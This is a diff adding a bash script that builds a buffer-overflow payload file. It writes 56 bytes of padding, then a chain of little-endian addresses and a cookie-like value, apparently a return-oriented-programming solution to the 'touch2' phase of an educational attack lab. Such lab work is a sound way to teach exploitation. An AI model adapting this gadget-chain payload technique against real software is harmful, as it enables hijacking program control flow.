@@ -1,0 +1,7 @@
+#!/bin/bash
+
+cd ..
+
+printf '0%.0s' {1..56} > injection/rtouch2.txt
+
+utils/h2r 3d 1b 40 00 00 00 00 00 e7 e9 88 57 00 00 00 00 4b 1b 40 00 00 00 00 00 87 19 40 00 00 00 00 00 >> injection/rtouch2.txt
